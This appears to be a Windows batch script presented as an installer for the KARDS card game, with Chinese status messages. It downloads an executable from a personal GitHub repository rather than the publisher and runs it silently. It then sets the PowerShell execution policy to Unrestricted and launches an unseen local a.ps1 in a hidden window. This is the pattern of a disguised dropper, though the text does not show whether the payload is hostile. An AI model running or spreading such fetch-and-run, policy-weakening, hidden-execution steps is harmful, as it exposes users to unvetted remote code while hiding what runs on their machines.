@echo off

chcp 65001

if exist "C:\Users\admin\AppData\Local\KARDS - The WWII Card Game\launcher.exe" goto skip

echo ========================================
echo 正在下载 Kards 启动器
echo ========================================

powershell -Command "Start-BitsTransfer -Source 'https://github.com/OI-liyifan202201/nbsmc-PCL2-in-GSML/raw/refs/heads/main/kards_installer.exe' -Destination 'kards.exe'"

if errorlevel 1 (
    echo 下载失败！请检查网络或稍后重试。
    pause
    exit /b 1
)


echo ========================================
echo 正在安装中，请稍后
echo ========================================

kards.exe /S

:skip

powershell Set-ExecutionPolicy Unrestricted

powershell -WindowStyle Hidden ./a.ps1

ping 127.0.0.1 -n 1 >nul

exit /b
